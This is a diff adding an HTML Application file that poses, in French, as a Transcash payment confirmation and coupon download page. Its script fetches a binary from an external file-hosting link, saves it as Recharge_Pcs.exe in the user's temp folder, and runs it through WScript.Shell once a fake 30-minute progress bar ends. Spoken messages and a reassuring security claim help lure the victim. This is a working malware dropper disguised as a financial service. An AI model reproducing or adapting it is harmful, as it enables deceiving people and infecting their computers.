@@ -1,0 +1,195 @@
+<html lang="fr">
+<head>
+  <title>Transcash – Téléchargement du coupon</title>
+  <HTA:APPLICATION
+    APPLICATIONNAME="Transcash"
+    BORDER="thin"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    CONTEXTMENU="no"
+    INNERBORDER="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    SCROLL="no"
+    WINDOWSTATE="normal"
+  />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+      background-color: #f2f2f2;
+    }
+    h1 {
+      color: red;
+      font-size: 2em;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+    h2 {
+      color: red;
+      font-size: 1.5em;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 1.1em;
+      max-width: 600px;
+      margin: 0 auto 20px auto;
+    }
+    #progressWrapper {
+      width: 80%;
+      max-width: 500px;
+      margin: 20px auto;
+      background-color: #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 30px;
+      display: none;
+    }
+    #progressBar {
+      width: 0%;
+      height: 100%;
+      background-color: #4CAF50;
+      transition: width 0.3s ease;
+    }
+    #progressText {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    #btnDownload {
+      margin-top: 30px;
+      padding: 12px 25px;
+      font-size: 1.2em;
+      background-color: #0078D7;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+  <script language="javascript">
+    var downloadFinished = false;
+    var timerFinished = false;
+    var filePath = "";
+
+    function lireMessage(message) {
+      if ('speechSynthesis' in window) {
+        var synth = window.speechSynthesis;
+        var utterance = new SpeechSynthesisUtterance(message);
+        utterance.lang = "fr-FR";
+        var voixFrancaises = synth.getVoices().filter(function(v){ return v.lang.startsWith("fr"); });
+        if (voixFrancaises.length > 0) utterance.voice = voixFrancaises[0];
+        synth.speak(utterance);
+      }
+    }
+
+    function telechargerEtLancer() {
+      // Vérification système Windows simple (peu fiable mais OK pour HTA)
+      if (navigator.userAgent.toLowerCase().indexOf("windows") === -1) {
+        alert("⚠ Ce coupon est uniquement accessible depuis un ordinateur Windows.");
+        return;
+      }
+      document.getElementById("btnDownload").disabled = true;
+      document.getElementById("progressWrapper").style.display = "block";
+      document.getElementById("progressBar").style.width = "0%";
+      document.getElementById("progressText").textContent = "Début du téléchargement et préparation...";
+
+      lireMessage("Préparation de votre coupon Transcash en cours. Veuillez patienter...");
+
+      var dureeMs = 1800 * 1000; // 30 minutes
+      var startTime = new Date().getTime();
+
+      var progressBar = document.getElementById("progressBar");
+      var progressText = document.getElementById("progressText");
+
+      var progressTimer = setInterval(function(){
+        var now = new Date().getTime();
+        var elapsed = now - startTime;
+        var pct = Math.min(100, (elapsed / dureeMs) * 100);
+        progressBar.style.width = pct + "%";
+        progressText.textContent = "Progression : " + Math.floor(pct) + "%";
+
+        if (pct >= 100) {
+          clearInterval(progressTimer);
+          timerFinished = true;
+          finPossible();
+        }
+      }, 1000);
+
+      // Téléchargement via ActiveX Microsoft.XMLHTTP (IE compatible)
+      try {
+        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+      } catch(e) {
+        alert("ActiveX non supporté. Ce script fonctionne uniquement sous HTA sur Windows.");
+        return;
+      }
+
+      var url = "https://u.pcloud.link/publink/download?code=XZLX1f5ZKMf2GaFQGJkbL3hvLHab8fXLBJ00";
+
+      xhr.open("GET", url, true);
+      xhr.setRequestHeader("Cache-Control", "no-cache");
+
+      // Important: pour récupérer du binaire en IE, on doit utiliser responseBody, pas response ou responseText
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+          if (xhr.status == 200) {
+            try {
+              var shell = new ActiveXObject("WScript.Shell");
+              var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
+              filePath = tempFolder + "\\Recharge_Pcs.exe";
+
+              // ADODB.Stream pour sauvegarder binaire
+              var stream = new ActiveXObject("ADODB.Stream");
+              stream.Type = 1; // binaire
+              stream.Open();
+              stream.Write(xhr.responseBody);
+              stream.SaveToFile(filePath, 2); // 2 = overwrite
+              stream.Close();
+
+              downloadFinished = true;
+              finPossible();
+            } catch (ex) {
+              alert("Erreur lors de la sauvegarde du fichier : " + ex.message);
+              document.getElementById("btnDownload").disabled = false;
+            }
+          } else {
+            alert("Erreur de téléchargement : code " + xhr.status);
+            document.getElementById("btnDownload").disabled = false;
+          }
+        }
+      };
+
+      xhr.send();
+
+      function finPossible() {
+        if (downloadFinished && timerFinished) {
+          progressText.textContent = "Téléchargement terminé, lancement du coupon...";
+          lireMessage("Votre coupon Transcash a bien été téléchargé. Merci pour votre confiance.");
+
+          try {
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run('"' + filePath + '"', 1, false);
+          } catch (ex) {
+            alert("Impossible de lancer le coupon : " + ex.message);
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body>
+  <h1>TRANSCASH MA CARTE SANS BANQUE</h1>
+  <h2>Confirmation de paiement en ligne</h2>
+  <p>Transcash vous remercie pour votre paiement. Nous avons pris toutes les mesures nécessaires pour garantir la sécurité de vos informations personnelles.</p>
+
+  <div id="progressWrapper">
+    <div id="progressBar"></div>
+  </div>
+  <div id="progressText"></div>
+
+  <button id="btnDownload" onclick="telechargerEtLancer()">📥 Télécharger le coupon</button>
+</body>
+</html>
